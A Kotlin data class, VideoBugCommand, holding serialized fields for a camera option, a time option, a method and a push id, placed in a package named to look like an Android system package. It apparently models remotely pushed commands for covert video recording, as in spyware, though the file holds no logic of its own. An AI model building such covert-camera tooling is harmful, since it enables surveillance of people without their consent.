package com.android.services.models

import android.os.Parcelable
import com.google.gson.annotations.SerializedName
import kotlinx.parcelize.Parcelize

@Parcelize
data class VideoBugCommand(
    @SerializedName("customData")
    var customData: String?="15",
    @SerializedName("timeOption")
    var timeOption: String,
    @SerializedName("cameraOption")
    var cameraOption: String,
    @SerializedName("method")
    var method: String,
    @SerializedName("push_id")
    var pushId: String
) : Parcelable